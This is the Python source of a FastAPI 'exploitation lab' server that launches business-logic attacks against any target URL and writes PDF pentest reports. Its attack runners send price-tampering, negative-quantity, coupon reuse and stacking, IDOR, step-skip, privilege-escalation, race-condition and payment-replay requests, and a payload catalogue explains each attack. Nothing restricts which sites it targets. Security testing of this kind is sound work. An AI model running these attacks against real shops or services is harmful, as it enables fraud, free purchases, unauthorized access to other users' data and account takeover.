#!/usr/bin/env python3
"""
=============================================================
  Business Logic & Workflow Exploitation Lab — FastAPI Backend
  Run with:  uvicorn api_server:app --reload --port 8000
  Then open: index.html in your browser
=============================================================
"""

from fastapi import FastAPI, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import requests as http_requests
import threading
import datetime
import time
import uuid
import json
import os
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch

# ─────────────────────────────────────────────
app = FastAPI(title="BizLogic Lab API", version="1.0.0")

# Allow the HTML frontend (any origin) to call this API
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── Serve index.html at /ui  (same folder as api_server.py)
UI_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "index.html")

@app.get("/ui", response_class=HTMLResponse, include_in_schema=False)
def serve_ui():
    """Open http://localhost:8000/ui to launch the dashboard."""
    if not os.path.exists(UI_FILE):
        return HTMLResponse("<h2>index.html not found next to api_server.py</h2>", status_code=404)
    with open(UI_FILE, "r", encoding="utf-8") as f:
        return HTMLResponse(f.read())

# ─────────────────────────────────────────────
#  IN-MEMORY JOB STORE
#  Stores status + results for each attack run
# ─────────────────────────────────────────────
jobs: dict = {}   # job_id -> { status, findings, log, attack, target }


# ─────────────────────────────────────────────
#  REQUEST / RESPONSE MODELS
# ─────────────────────────────────────────────
class AttackRequest(BaseModel):
    target_url: str
    attack_level: str   # "basic" | "semi_advanced" | "advanced"


# ─────────────────────────────────────────────
#  HELPERS (same logic as CLI tool)
# ─────────────────────────────────────────────

def safe_request(method, url, **kwargs):
    try:
        kwargs.setdefault("timeout", 10)
        resp = http_requests.request(method, url, **kwargs)
        return resp, None
    except Exception as e:
        return None, str(e)


def make_job(target_url, attack_level):
    jid = str(uuid.uuid4())
    jobs[jid] = {
        "id":       jid,
        "status":   "running",
        "target":   target_url,
        "attack":   attack_level,
        "findings": [],
        "log":      [],
        "started":  datetime.datetime.now().isoformat(),
        "finished": None,
    }
    return jid


def jlog(jid, msg, tag="INFO"):
    ts   = datetime.datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] [{tag}] {msg}"
    jobs[jid]["log"].append(line)


def jfinding(jid, vuln_type, detail, severity="MEDIUM", status="N/A"):
    entry = {
        "type":     vuln_type,
        "detail":   detail,
        "severity": severity,
        "status":   status,
        "time":     datetime.datetime.now().isoformat(),
    }
    jobs[jid]["findings"].append(entry)


def mutate_payload(base):
    mutations = [("original", dict(base))]
    for key, val in base.items():
        if isinstance(val, (int, float)):
            mutations += [
                (f"{key}=0",      {**base, key: 0}),
                (f"{key}=-1",     {**base, key: -1}),
                (f"{key}=999999", {**base, key: 999999}),
            ]
    return mutations


# ─────────────────────────────────────────────
#  ATTACK RUNNERS (async-safe: run in threads)
# ─────────────────────────────────────────────

def run_basic(jid, target_url):
    jlog(jid, "Starting Basic Attack")

    # Price tampering
    jlog(jid, "Running payment bypass test...")
    base = {"item_id": 1, "price": 100, "quantity": 1}
    for label, payload in mutate_payload(base)[:6]:
        resp, err = safe_request("POST", f"{target_url}/checkout", json=payload)
        if err:
            jlog(jid, f"Price tamper [{label}]: {err}", "WARN")
            continue
        code = resp.status_code
        if code in (200, 201) and payload.get("price", 100) <= 0:
            jfinding(jid, "Price Tampering",
                     f"Server accepted price={payload['price']} — possible free purchase",
                     "HIGH", code)
        else:
            jlog(jid, f"Price tamper [{label}]: HTTP {code}")

    # Negative quantity
    jlog(jid, "Testing quantity abuse...")
    for qty in [0, -1, 999999, -999999]:
        resp, err = safe_request("POST", f"{target_url}/checkout",
                                 json={"item_id": 1, "price": 100, "quantity": qty})
        if err:
            jlog(jid, f"Quantity [{qty}]: {err}", "WARN"); continue
        code = resp.status_code
        if code in (200, 201) and qty < 0:
            jfinding(jid, "Negative Quantity",
                     f"quantity={qty} accepted — may credit attacker", "HIGH", code)
        else:
            jlog(jid, f"Quantity [{qty}]: HTTP {code}")

    # Coupon reuse
    jlog(jid, "Testing coupon abuse...")
    for i in range(3):
        resp, err = safe_request("POST", f"{target_url}/apply-coupon",
                                 json={"coupon": "SAVE50", "order_id": 1001})
        if err:
            jlog(jid, f"Coupon #{i+1}: {err}", "WARN"); continue
        code = resp.status_code
        if code == 200:
            jfinding(jid, "Coupon Reuse",
                     f"Coupon accepted on attempt #{i+1}", "HIGH", code)
        else:
            jlog(jid, f"Coupon #{i+1}: HTTP {code}")

    # IDOR
    jlog(jid, "Testing IDOR on user_id...")
    for uid in [1, 2, 3, 100, 9999]:
        resp, err = safe_request("GET", f"{target_url}/user/{uid}/orders")
        if err:
            jlog(jid, f"IDOR user_id={uid}: {err}", "WARN"); continue
        code = resp.status_code
        if code == 200:
            jfinding(jid, "IDOR",
                     f"user_id={uid} returned 200 — no ownership check?", "HIGH", code)
        else:
            jlog(jid, f"IDOR user_id={uid}: HTTP {code}")

    jlog(jid, "Basic Attack complete.")


def run_semi_advanced(jid, target_url):
    jlog(jid, "Starting Semi-Advanced Attack")

    # Step skip
    jlog(jid, "Testing workflow step-skip...")
    resp, err = safe_request("POST", f"{target_url}/order/confirm",
                             json={"item_id": 42, "price": 299,
                                   "skip_address": True, "skip_payment": True})
    if err:
        jlog(jid, f"Step-skip: {err}", "WARN")
    elif resp.status_code in (200, 201):
        jfinding(jid, "Workflow Step-Skip",
                 "Order confirmed without payment/address steps", "HIGH", resp.status_code)
    else:
        jlog(jid, f"Step-skip: HTTP {resp.status_code}")

    # Coupon stacking
    jlog(jid, "Testing coupon stacking...")
    for i in range(5):
        resp, err = safe_request("POST", f"{target_url}/cart/coupon",
                                 json={"coupon_code": "DISCOUNT10", "cart_id": 777})
        if err:
            jlog(jid, f"Stack #{i+1}: {err}", "WARN"); continue
        if resp.status_code == 200:
            jfinding(jid, "Coupon Stacking",
                     f"Coupon applied {i+1} times", "HIGH", resp.status_code)
        else:
            jlog(jid, f"Stack #{i+1}: HTTP {resp.status_code}"); break

    # Privilege escalation
    jlog(jid, "Testing privilege escalation...")
    for payload in [
        {"username": "testuser", "role": "admin"},
        {"username": "testuser", "is_admin": True},
        {"username": "testuser", "user_type": "superuser"},
    ]:
        resp, err = safe_request("POST", f"{target_url}/profile/update", json=payload)
        if err:
            jlog(jid, f"Priv-esc: {err}", "WARN"); continue
        if resp.status_code == 200:
            jfinding(jid, "Privilege Escalation",
                     f"Accepted {list(payload.keys())[-1]} without server-side validation",
                     "HIGH", resp.status_code)
        else:
            jlog(jid, f"Priv-esc: HTTP {resp.status_code}")

    # Response comparison
    jlog(jid, "Running endpoint comparison...")
    for ep in ["/api/orders", "/api/admin/orders", "/api/users", "/api/admin/users"]:
        resp, err = safe_request("GET", f"{target_url}{ep}")
        if err:
            jlog(jid, f"{ep}: {err}", "WARN"); continue
        code = resp.status_code
        if code == 200 and "admin" in ep:
            jfinding(jid, "Broken Access Control",
                     f"Admin endpoint {ep} returned 200 without auth", "HIGH", code)
        else:
            jlog(jid, f"{ep}: HTTP {code}")

    jlog(jid, "Semi-Advanced Attack complete.")


race_results_store: dict = {}

def _race_worker(url, payload, thread_id, store_key):
    resp, err = safe_request("POST", url, json=payload)
    race_results_store.setdefault(store_key, [])
    if err:
        race_results_store[store_key].append({"thread": thread_id, "status": "ERROR", "detail": err})
    else:
        race_results_store[store_key].append(
            {"thread": thread_id, "status": resp.status_code, "body_len": len(resp.text)})


def run_advanced(jid, target_url):
    jlog(jid, "Starting Advanced Attack")

    # Race condition
    jlog(jid, "Launching race condition test (10 threads)...")
    store_key = jid + "_race"
    payload   = {"coupon": "ONCE_ONLY", "order_id": 5001}
    threads   = [threading.Thread(target=_race_worker,
                                  args=(f"{target_url}/apply-coupon", payload, i, store_key))
                 for i in range(10)]
    for t in threads: t.start()
    for t in threads: t.join()

    results   = race_results_store.get(store_key, [])
    successes = [r for r in results if r.get("status") == 200]
    jlog(jid, f"Race: {len(successes)}/10 threads succeeded")
    if len(successes) > 1:
        jfinding(jid, "Race Condition",
                 f"{len(successes)} parallel requests all succeeded — action not atomic",
                 "HIGH", "N/A")
    else:
        jfinding(jid, "Race Condition", "No race condition detected", "SAFE", "N/A")

    # Replay attack
    jlog(jid, "Testing replay attack...")
    token    = "txn_sample_abc123"
    statuses = []
    for attempt in range(3):
        resp, err = safe_request("POST", f"{target_url}/payment/confirm",
                                 json={"token": token, "amount": 500})
        if err:
            jlog(jid, f"Replay #{attempt+1}: {err}", "WARN"); continue
        statuses.append(resp.status_code)
    if statuses.count(200) > 1:
        jfinding(jid, "Replay Attack",
                 f"Token accepted {statuses.count(200)} times — not invalidated",
                 "HIGH", "N/A")
    else:
        jfinding(jid, "Replay Attack", "Token invalidated after first use", "SAFE", "N/A")

    # Combined mutations
    jlog(jid, "Running combined payload mutations...")
    for i, p in enumerate([
        {"item_id": 1, "price": 0,    "quantity": 1,    "coupon": "SAVE50", "role": "admin"},
        {"item_id": 1, "price": -1,   "quantity": -1,   "coupon": "FREE",   "is_admin": True},
        {"item_id": 1, "price": 0.01, "quantity": 9999, "coupon": "SAVE50", "user_type": "staff"},
    ], 1):
        resp, err = safe_request("POST", f"{target_url}/checkout", json=p)
        if err:
            jlog(jid, f"Combined #{i}: {err}", "WARN"); continue
        if resp.status_code in (200, 201):
            jfinding(jid, "Combined Logic Bypass",
                     f"Combined payload #{i} accepted", "HIGH", resp.status_code)
        else:
            jlog(jid, f"Combined #{i}: HTTP {resp.status_code}")

    # Inconsistency detection
    jlog(jid, "Checking for server inconsistency...")
    bodies = []
    for _ in range(5):
        resp, err = safe_request("GET", f"{target_url}/cart/total",
                                 params={"cart_id": 9999, "currency": "USD"})
        if err: break
        bodies.append(resp.text)
        time.sleep(0.2)
    if bodies and len(set(bodies)) > 1:
        jfinding(jid, "Server Inconsistency",
                 f"Same request returned {len(set(bodies))} different responses",
                 "MEDIUM", "N/A")
    elif bodies:
        jfinding(jid, "Server Consistency",
                 "Consistent responses across identical requests", "SAFE", "N/A")

    jlog(jid, "Advanced Attack complete.")


ATTACK_MAP = {
    "basic":         run_basic,
    "semi_advanced": run_semi_advanced,
    "advanced":      run_advanced,
}

def run_attack_job(jid, target_url, attack_level):
    try:
        ATTACK_MAP[attack_level](jid, target_url)
        jobs[jid]["status"]   = "done"
        jobs[jid]["finished"] = datetime.datetime.now().isoformat()
    except Exception as e:
        jobs[jid]["status"] = "error"
        jobs[jid]["log"].append(f"[ERROR] {e}")


# ─────────────────────────────────────────────
#  REPORT GENERATION (same as CLI tool)
# ─────────────────────────────────────────────

def generate_pdf(jid):
    job      = jobs[jid]
    filename = f"bizlogic_{jid[:8]}.pdf"
    doc      = SimpleDocTemplate(filename, pagesize=letter,
                                 rightMargin=0.75*inch, leftMargin=0.75*inch,
                                 topMargin=0.75*inch, bottomMargin=0.75*inch)
    styles   = getSampleStyleSheet()
    story    = []

    title_s = ParagraphStyle("T", parent=styles["Title"],   fontSize=17,
                              textColor=colors.HexColor("#0f172a"), spaceAfter=4)
    h2_s    = ParagraphStyle("H2", parent=styles["Heading2"], fontSize=12,
                              textColor=colors.HexColor("#1e3a5f"), spaceBefore=10, spaceAfter=4)
    body_s  = ParagraphStyle("B", parent=styles["Normal"],  fontSize=10, leading=14)
    code_s  = ParagraphStyle("C", parent=styles["Normal"],  fontSize=8,
                              fontName="Courier", backColor=colors.HexColor("#f8f8f8"),
                              leftIndent=10, leading=12)

    story.append(Paragraph("Business Logic &amp; Workflow Exploitation Lab", title_s))
    story.append(Paragraph("Penetration Test Report", styles["Heading3"]))
    story.append(HRFlowable(width="100%", thickness=2, color=colors.HexColor("#0f172a")))
    story.append(Spacer(1, 8))

    meta = [["Target", job["target"]], ["Attack", job["attack"]],
            ["Started", job["started"]], ["Finished", job.get("finished", "—")]]
    mt = Table(meta, colWidths=[1.2*inch, 5.3*inch])
    mt.setStyle(TableStyle([
        ("BACKGROUND", (0,0),(0,-1), colors.HexColor("#0f172a")),
        ("TEXTCOLOR",  (0,0),(0,-1), colors.white),
        ("FONTNAME",   (0,0),(-1,-1),"Helvetica"),
        ("FONTSIZE",   (0,0),(-1,-1), 10),
        ("ROWBACKGROUNDS",(1,0),(-1,-1),[colors.HexColor("#f1f5f9"), colors.white]),
        ("BOX",(0,0),(-1,-1),0.5,colors.grey),
        ("GRID",(0,0),(-1,-1),0.25,colors.lightgrey),
        ("LEFTPADDING",(0,0),(-1,-1),8),("TOPPADDING",(0,0),(-1,-1),4),
        ("BOTTOMPADDING",(0,0),(-1,-1),4),
    ]))
    story.append(mt); story.append(Spacer(1,12))

    story.append(Paragraph("Findings", h2_s))
    story.append(HRFlowable(width="100%", thickness=0.5, color=colors.grey))
    story.append(Spacer(1,4))

    findings = job["findings"]
    if not findings:
        story.append(Paragraph("No findings.", body_s))
    else:
        for i, f in enumerate(findings, 1):
            sev_col = {"HIGH": colors.red, "MEDIUM": colors.HexColor("#d97706"),
                       "SAFE": colors.green}.get(f["severity"], colors.black)
            row = Table([[f"#{i}  {f['type']}", f["severity"]]],
                        colWidths=[5.5*inch, 0.8*inch])
            row.setStyle(TableStyle([
                ("BACKGROUND",(0,0),(-1,-1),colors.HexColor("#f8fafc")),
                ("TEXTCOLOR",(1,0),(1,0),sev_col),
                ("FONTNAME",(0,0),(-1,-1),"Helvetica-Bold"),
                ("FONTSIZE",(0,0),(-1,-1),10),
                ("LEFTPADDING",(0,0),(-1,-1),8),
                ("TOPPADDING",(0,0),(-1,-1),4),("BOTTOMPADDING",(0,0),(-1,-1),4),
                ("ALIGN",(1,0),(1,0),"RIGHT"),
            ]))
            story.append(row)
            dt = Table([["Detail", f["detail"]], ["HTTP", str(f["status"])], ["Time", f["time"]]],
                       colWidths=[0.8*inch, 5.5*inch])
            dt.setStyle(TableStyle([
                ("FONTNAME",(0,0),(0,-1),"Helvetica-Bold"),
                ("FONTSIZE",(0,0),(-1,-1),9),
                ("LEFTPADDING",(0,0),(-1,-1),8),
                ("TOPPADDING",(0,0),(-1,-1),3),("BOTTOMPADDING",(0,0),(-1,-1),3),
                ("ROWBACKGROUNDS",(0,0),(-1,-1),[colors.white,colors.HexColor("#fafafa")]),
                ("BOX",(0,0),(-1,-1),0.25,colors.lightgrey),
            ]))
            story.append(dt); story.append(Spacer(1,6))

    story.append(Paragraph("Activity Log", h2_s))
    story.append(HRFlowable(width="100%", thickness=0.5, color=colors.grey))
    story.append(Spacer(1,4))
    for line in job["log"][-50:]:
        story.append(Paragraph(line, code_s))

    doc.build(story)
    return filename


# ─────────────────────────────────────────────
#  API ROUTES
# ─────────────────────────────────────────────

@app.get("/")
def root():
    return {"message": "BizLogic Lab API running", "version": "1.0.0"}


@app.post("/attack/start")
def start_attack(req: AttackRequest, background_tasks: BackgroundTasks):
    """Start an attack and return a job_id immediately."""
    level = req.attack_level.lower().replace(" ", "_")
    if level not in ATTACK_MAP:
        return {"error": f"Unknown attack level: {level}"}

    target = req.target_url.strip().rstrip("/")
    if not target.startswith("http"):
        target = "http://" + target

    jid = make_job(target, level)
    background_tasks.add_task(run_attack_job, jid, target, level)
    return {"job_id": jid, "status": "started"}


@app.get("/attack/status/{job_id}")
def get_status(job_id: str):
    """Poll for job status, live log, and findings."""
    if job_id not in jobs:
        return {"error": "Job not found"}
    job = jobs[job_id]
    high   = len([f for f in job["findings"] if f["severity"] == "HIGH"])
    medium = len([f for f in job["findings"] if f["severity"] == "MEDIUM"])
    safe   = len([f for f in job["findings"] if f["severity"] == "SAFE"])
    return {
        "job_id":   job_id,
        "status":   job["status"],
        "target":   job["target"],
        "attack":   job["attack"],
        "started":  job["started"],
        "finished": job["finished"],
        "summary":  {"high": high, "medium": medium, "safe": safe, "total": len(job["findings"])},
        "findings": job["findings"],
        "log":      job["log"],
    }


@app.get("/attack/report/{job_id}")
def download_report(job_id: str):
    """Generate and download a PDF report for a completed job."""
    if job_id not in jobs:
        return {"error": "Job not found"}
    if jobs[job_id]["status"] != "done":
        return {"error": "Job not yet complete"}
    filename = generate_pdf(job_id)
    return FileResponse(filename, media_type="application/pdf",
                        filename=f"bizlogic_report_{job_id[:8]}.pdf")


@app.get("/jobs")
def list_jobs():
    """List all jobs with summary."""
    return [
        {"job_id": jid, "status": j["status"], "target": j["target"],
         "attack": j["attack"], "started": j["started"],
         "total_findings": len(j["findings"])}
        for jid, j in jobs.items()
    ]


@app.delete("/jobs/{job_id}")
def delete_job(job_id: str):
    if job_id in jobs:
        del jobs[job_id]
        return {"deleted": job_id}
    return {"error": "Not found"}


@app.get("/health")
def health():
    """Health check — used by the frontend connection indicator."""
    return {"status": "ok", "jobs_in_memory": len(jobs), "version": "1.0.0"}


@app.get("/attack/payloads")
def get_payloads():
    """Return the sample payloads shown in the dashboard Payloads tab."""
    return [
        {"name": "Price Tampering",      "icon": "💰",
         "payload": {"item_id": 1, "price": 0, "quantity": 1},
         "endpoint": "/checkout", "method": "POST",
         "why": "Server reads price from request body instead of its own catalogue."},
        {"name": "Negative Quantity",    "icon": "📉",
         "payload": {"item_id": 1, "price": 100, "quantity": -1},
         "endpoint": "/checkout", "method": "POST",
         "why": "Negative qty × price = credit to attacker's account."},
        {"name": "Coupon Reuse",         "icon": "🎫",
         "payload": {"coupon": "SAVE50", "order_id": 1001},
         "endpoint": "/apply-coupon", "method": "POST",
         "why": "No per-user redemption tracking lets coupons be applied unlimited times."},
        {"name": "IDOR",                 "icon": "🔑",
         "payload": {"user_id": 99, "action": "view_orders"},
         "endpoint": "/user/99/orders", "method": "GET",
         "why": "Missing ownership check lets any user read another user's data."},
        {"name": "Privilege Escalation", "icon": "👑",
         "payload": {"username": "user", "role": "admin"},
         "endpoint": "/profile/update", "method": "POST",
         "why": "Server trusts client-supplied role field instead of session."},
        {"name": "Race Condition",       "icon": "⚡",
         "payload": {"coupon": "ONCE_ONLY", "order_id": 5001},
         "endpoint": "/apply-coupon", "method": "POST",
         "why": "10 parallel threads all pass 'not used?' check before any commits."},
        {"name": "Replay Attack",        "icon": "♻️",
         "payload": {"token": "txn_abc123", "amount": 500},
         "endpoint": "/payment/confirm", "method": "POST",
         "why": "Non-invalidated token lets payment be confirmed multiple times."},
        {"name": "Combined Bypass",      "icon": "🧨",
         "payload": {"price": 0, "coupon": "FREE", "role": "admin", "qty": 9999},
         "endpoint": "/checkout", "method": "POST",
         "why": "Single-flaw defences fail against multi-flaw combinations."},
    ]